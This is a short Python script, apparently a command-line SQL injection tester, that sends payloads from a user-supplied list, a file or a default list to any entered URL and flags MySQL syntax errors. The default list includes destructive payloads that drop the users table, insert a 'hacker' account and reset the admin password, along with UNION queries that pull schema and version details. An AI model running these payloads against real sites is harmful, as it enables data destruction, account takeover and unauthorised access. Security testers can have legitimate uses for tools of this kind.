import requests

def test_sql_injection(url, payload):
    payload = f"' OR {payload} --"
    injected_url = f"{url}?id={payload}"
    response = requests.get(injected_url)
    
    if "error in your SQL syntax" in response.text:
        return True
    return False

def test_with_payloads(target_url, payloads):
    print(f"Testing SQL injection on {target_url}...\n")

    for payload in payloads:
        if test_sql_injection(target_url, payload):
            print(f"Potential SQL Injection detected with payload: {payload}")
        else:
            print(f"No SQL Injection detected with payload: {payload}")

def main():
    target_url = input("Enter the target URL to test for SQL injection: ")
    
    print("\nSelect an option:")
    print("A: Use custom payloads")
    print("B: Use default payloads")
    print("C: Load payloads from file")

    choice = input("Enter your choice (A/B/C): ").upper()

    if choice == "A":
        custom_payloads = input("Enter custom payloads separated by commas: ").split(",")
        test_with_payloads(target_url, custom_payloads)
    elif choice == "B":
        default_payloads = [
            "1' OR '1'='1",
            "1' OR '1'='2",
            "1' UNION SELECT NULL, table_name FROM information_schema.tables --",
            "1' UNION SELECT user(), database(), version(), NULL --",
            "1' AND 1=1 --",
            "1' AND 1=2 --",
            "1'; DROP TABLE users; --",
            "1'; INSERT INTO users (username, password) VALUES ('hacker', 'pwned'); --",
            "1'; UPDATE users SET password='newpass' WHERE username='admin'; --",
            # ... Add more default payloads here ...
        ]
        test_with_payloads(target_url, default_payloads)
    elif choice == "C":
        file_path = input("Enter the path to the payloads file: ")
        with open(file_path, "r") as file:
            custom_payloads = file.read().splitlines()
            test_with_payloads(target_url, custom_payloads)
    else:
        print("Invalid choice. Please choose either 'A', 'B', or 'C'.")

if __name__ == "__main__":
    main()
